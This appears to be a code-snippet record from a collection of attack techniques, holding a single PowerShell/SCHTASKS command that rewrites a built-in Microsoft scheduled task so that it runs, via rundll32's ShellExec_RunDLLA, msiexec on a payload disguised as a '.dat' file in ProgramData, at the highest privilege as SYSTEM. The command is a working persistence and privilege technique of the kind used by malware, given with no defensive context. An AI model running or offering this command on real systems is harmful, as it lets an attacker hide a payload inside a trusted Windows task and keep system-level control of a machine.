---
id: 77aac6de-e698-42f9-bff4-0ff78d5931a3
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:27.837304+00:00'
updated_at: '2023-04-10T20:37:30.433027+00:00'
---

# Code Snippet 77aac6de

**Language**: Powershell

```powershell
# Launch an executable by calling the ShellExec_RunDLL function.
SCHTASKS /Change /tn "\Microsoft\Windows\PLA\Server Manager Performance Monitor" /TR "C:\windows\system32\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat" /RL HIGHEST /RU "" /ENABLE
```
